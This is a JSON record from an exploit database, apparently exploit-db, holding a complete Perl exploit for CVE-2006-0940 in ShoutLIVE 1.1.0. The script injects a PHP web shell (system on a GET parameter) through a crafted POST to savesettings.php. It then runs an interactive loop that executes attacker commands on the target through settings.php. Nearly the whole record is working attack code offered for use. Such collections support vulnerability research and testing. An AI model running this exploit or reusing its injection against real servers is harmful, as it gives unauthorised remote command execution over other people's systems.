{
  "id": "1590",
  "title": "ShoutLIVE 1.1.0 - &#039;savesettings.php&#039; Remote Code Execution",
  "cve": "CVE-2006-0940",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n##################################################\r\n# ShoutLIVE <= 1.1.0 Remote Php Code Execution\r\n# Based on: http://www.frsirt.com/bulletins/4109\r\n# Credits: Coded by DarkFig\r\n# Website: http://disarm.free.fr/bo_hard/\r\n# Greetz: All AcidRoot/Bod members =)\r\n##################################################\r\nuse IO::Socket;\r\nuse LWP::Simple;\r\n\r\nif(!$ARGV[1]){headers();\r\nprint \"\\n| Usage: perl shoutlive110.pl <host> <path>   |\r\n+---------------------------------------------+\r\n| Coded by DarkFig |\r\n+------------------+\r\n\";exit}\r\n\r\nsub headers() {\r\nprint \"\\n\r\n+----------------------------------------------+\r\n| ShoutLIVE <= 1.1.0 Remote Php Code Execution |\r\n+----------------------------------------------+\";}\r\n\r\n$host = $ARGV[0];\r\n$path = $ARGV[1];\r\nheaders();\r\n$ncon = \"\\n [-]Can't connect to $host...\";\r\n$ycon = \"\\n [+]Connected to $host...\";\r\n$sdat = \"\\n [~]Sending malicious request...\";\r\n$ycmd = \"\\n [+]System command writed...\";\r\n$req1 = \"send_email=0\\\" ?> <? \\$cmd = \\$_GET\\['cmd']; system(\\$cmd); ?> <? #\";\r\n$lgr1 = length $req1;\r\n$psti = \"$path\".\"savesettings.php\";\r\n\r\nmy $sock = new IO::Socket::INET(PeerAddr => \"$host\", PeerPort => \"80\", Proto => \"tcp\") or die \"$ncon\";\r\nprint \"$ycon\".\"$sdat\";\r\nprint $sock \"POST $psti HTTP/1.1\r\nHost: $host\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $lgr1\r\n\r\n$req1\\n\";\r\nclose($sock);\r\nprint \"$ycmd\";\r\n\r\nwhile(1 ne 2){\r\nprint \"\\n [$host]\\$ \";chomp($cmd = <STDIN>);\r\nif($cmd eq \"exit\"){eofi();}\r\n$req2 = \"http://\".\"$host\".\"$path\".\"settings.php\".\"?cmd=\".\"$cmd\";\r\n$page = get($req2) or die \"$ncon\";\r\nprint $page;}\r\n\r\nsub eofi() {\r\nprint \"+----------------------------------------------+\r\n|     Coded by DarkFig : [*BoD*]_AcidRoot      |\r\n+----------------------------------------------+\\n\";exit;}\r\n\r\n# milw0rm.com [2006-03-18]",
  "url": "https://www.exploit-db.com/exploits/1590"
}